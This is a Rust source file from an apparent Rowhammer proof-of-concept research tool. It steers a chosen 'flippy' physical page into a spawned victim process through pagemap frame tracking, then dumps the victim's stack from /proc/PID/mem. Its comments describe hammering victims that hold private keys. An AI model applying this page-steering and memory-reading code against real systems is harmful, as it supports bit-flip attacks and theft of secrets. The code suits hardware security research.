use std::{
    fs::OpenOptions,
    io::{Read, Seek, SeekFrom},
    ptr::null_mut,
    time::Duration,
};

use anyhow::bail;
use bs_poc::{
    allocator::util::{mmap, munmap},
    memory::{LinuxPageMap, PageMapInfo, VirtToPhysResolver},
    util::PAGE_SHIFT,
};
use clap::{arg, Parser};
use log::{debug, info, warn};
use pagemap::MemoryRegion;

/// CLI arguments for the `hammer` binary.
///
/// This struct defines the command line arguments that can be passed to the `hammer` binary.
#[derive(Debug, Parser)]
struct CliArgs {
    /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
    /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
    /// A repetition denotes a complete run of the suite:
    /// 1. allocate memory using the requested `alloc-strategy`
    /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
    /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
    /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
    #[arg(long)]
    repeat: Option<Option<usize>>,
    /// The number of rounds to profile for vulnerable addresses.
    /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
    #[arg(long, default_value = "10")]
    profiling_rounds: u64,
    /// The number of rounds to hammer per repetition.
    /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
    /// At the start of a round, the victim is initialized. The concrete intialization depends on the victim implementation. For example, a MemCheck
    /// victim will initialize the memory with a random seed, while a process victim might generate a new private key for each round.
    #[arg(long, default_value = "1")]
    rounds: u64,
    /// The number of hammering attempts per round.
    /// An attempt denotes a single run of the hammering code. Usually, hammerers need several attempts to successfully flip a bit in the victim.
    /// The default value of 100 is a good starting point for the blacksmith hammerer.
    #[arg(long, default_value = "20")]
    attempts: u8,
    /// Do a stats run. This will run the hammerer and store the results in the provided file. The default is `None`, causing no stats to be stored.
    /// When `stats` is set, the hammering process will not exit after the first successful attack, but continue hammering until `repeat` is reached.
    #[arg(long)]
    statistics: Option<String>,
    /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
    target: Vec<String>,
}

fn main() -> anyhow::Result<()> {
    env_logger::init();
    const PAGE_SIZE: usize = 4096;
    //const NUM_PAGES: usize = 1 << 21; // 8 GB
    //const ALLOC_SIZE: usize = NUM_PAGES * PAGE_SIZE;
    let args = CliArgs::parse();
    let bait_count = 18;
    let bait_count_before = 10;
    assert!(bait_count_before < bait_count);
    let mut pfns = vec![];
    let mut reused = vec![];
    info!(
        "{} bait pages, of which {} are unmapped before the flippy page",
        bait_count, bait_count_before
    );
    let x: *mut libc::c_void = mmap(null_mut(), PAGE_SIZE);
    if x.is_null() {
        bail!("Allocation failed");
    }
    let padding: *mut libc::c_void = mmap(null_mut(), (bait_count - 1) * PAGE_SIZE);
    if padding.is_null() {
        bail!("Allocation failed");
    }
    debug!("Collecting PFNs...");
    let mut pmap = LinuxPageMap::new()?;
    let region = MemoryRegion::from((
        padding as u64,
        padding as u64 + (bait_count_before * PAGE_SIZE) as u64,
    ));
    pfns.append(
        &mut pmap
            .get_phys_range(region)?
            .into_iter()
            .map(|p| p >> PAGE_SHIFT)
            .collect(),
    );
    let region = MemoryRegion::from((x as u64, x as u64 + PAGE_SIZE as u64));
    pfns.append(
        &mut pmap
            .get_phys_range(region)?
            .into_iter()
            .map(|p| p >> PAGE_SHIFT)
            .collect(),
    );
    let region = MemoryRegion::from((
        padding as u64 + (bait_count_before * PAGE_SIZE) as u64,
        padding as u64 + ((bait_count - 1) * PAGE_SIZE) as u64,
    ));
    pfns.append(
        &mut pmap
            .get_phys_range(region)?
            .into_iter()
            .map(|p| p >> PAGE_SHIFT)
            .collect::<Vec<u64>>(),
    );
    debug!("PFNs collected");
    info!("Launching victim");
    let cmd = args.target.first().expect("No target provided");
    let mut cmd = std::process::Command::new(cmd);
    cmd.args(args.target.iter().skip(1));
    unsafe {
        munmap(padding, bait_count_before * PAGE_SIZE);
        munmap(x, PAGE_SIZE);
        munmap(
            padding.byte_add(bait_count_before * PAGE_SIZE),
            (bait_count - bait_count_before - 1) * PAGE_SIZE,
        )
    };
    cmd.stdout(std::process::Stdio::piped());
    cmd.stderr(std::process::Stdio::piped());
    let handle = cmd.spawn()?;
    let pid = handle.id();
    std::thread::sleep(Duration::from_millis(500));
    let pmap = PageMapInfo::load(pid as u64)?.0;
    let mut flippy_region = None;
    for (map, pagemap) in pmap {
        debug!("Region size: {}", map.0.memory_region().size());
        println!("{:?}", map.0);
        for (va, pmap) in pagemap {
            let pfn = pmap.pfn();
            match pfn {
                Ok(pfn) => {
                    print!("{:#x}    {:#x}", va, pfn);
                    if pfns.contains(&pfn) {
                        println!(
                            " [REUSED] was at page offset {} {}",
                            pfns.iter().position(|x| x == &pfn).unwrap(),
                            if pfns[bait_count_before] == pfn {
                                "[FLIPPY PAGE]"
                            } else {
                                "[PADDING PAGE]"
                            }
                        );
                        if pfn == pfns[bait_count_before] {
                            flippy_region = Some(map.0.clone());
                        }
                        reused.push(pfn);
                    } else {
                        println!();
                    }
                    if let Some("[stack]") = map.0.path() {
                        let contents = read_memory_from_proc(pid, va, 4096)?;
                        for (i, byte) in contents.iter().enumerate() {
                            print!("{:02x}", byte);
                            if i % 8 == 7 {
                                print!(" ");
                            }
                            if i % 64 == 63 {
                                println!();
                            }
                        }
                    }
                }
                Err(e) => match e {
                    pagemap::PageMapError::PageNotPresent => {
                        println!("{:#x}    ???", va);
                    }
                    _ => bail!(e),
                },
            }
        }
    }
    if let Some(flippy_region) = flippy_region {
        info!("Flippy page reused in region {:?}", flippy_region);
    } else {
        warn!("Flippy page not reused");
    }
    info!(
        "Reused {} of {} pages. Ratio {}",
        reused.len(),
        bait_count,
        reused.len() as f64 / bait_count as f64
    );
    let output = handle.wait_with_output()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    info!("Child output:\n{}", stdout);
    Ok(())
}

fn read_memory_from_proc(pid: u32, va: u64, size: u64) -> std::io::Result<Vec<u8>> {
    // Construct the path to the process's memory file
    let path = format!("/proc/{}/mem", pid);
    let mut file = OpenOptions::new().read(true).open(path)?;

    // Seek to the virtual memory address
    file.seek(SeekFrom::Start(va))?;

    // Read the specified number of bytes into a buffer
    let mut buffer = vec![0; size as usize];
    file.read_exact(&mut buffer)?;

    Ok(buffer)
}
